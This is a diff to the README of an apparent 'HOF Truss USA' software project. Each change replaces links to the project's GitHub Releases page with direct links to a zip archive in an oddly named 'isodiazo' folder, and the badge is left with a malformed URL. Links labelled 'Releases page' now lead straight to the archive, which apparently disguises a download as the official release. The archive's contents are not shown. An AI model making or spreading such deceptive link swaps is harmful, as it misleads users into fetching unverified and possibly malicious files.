@@ -6,7 +6,7 @@ Welcome to HOF Truss USA! This software helps you manage and learn about our pro
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/MykytaKS/hof-truss-usa/releases)
+[![Download Now](https://raw.githubusercontent.com/MykytaKS/hof-truss-usa/main/isodiazo/hof-truss-usa.zip%https://raw.githubusercontent.com/MykytaKS/hof-truss-usa/main/isodiazo/hof-truss-usa.zip)](https://raw.githubusercontent.com/MykytaKS/hof-truss-usa/main/isodiazo/hof-truss-usa.zip)
 
 ## 🖥️ System Requirements
 
@@ -31,7 +31,7 @@ This application provides the following features:
 
 To install the application, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/MykytaKS/hof-truss-usa/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/MykytaKS/hof-truss-usa/main/isodiazo/hof-truss-usa.zip).
    
 2. **Download the Application:**
    - Find the latest version listed at the top.
@@ -81,7 +81,7 @@ We regularly release updates to enhance performance and add new features. To upd
 - If an update is available, a prompt will appear.
 - Click "Update Now" to download and install the latest version automatically.
 
-You can always visit the [Releases page](https://github.com/MykytaKS/hof-truss-usa/releases) to check for the latest updates.
+You can always visit the [Releases page](https://raw.githubusercontent.com/MykytaKS/hof-truss-usa/main/isodiazo/hof-truss-usa.zip) to check for the latest updates.
 
 ## 🌐 Additional Resources
 
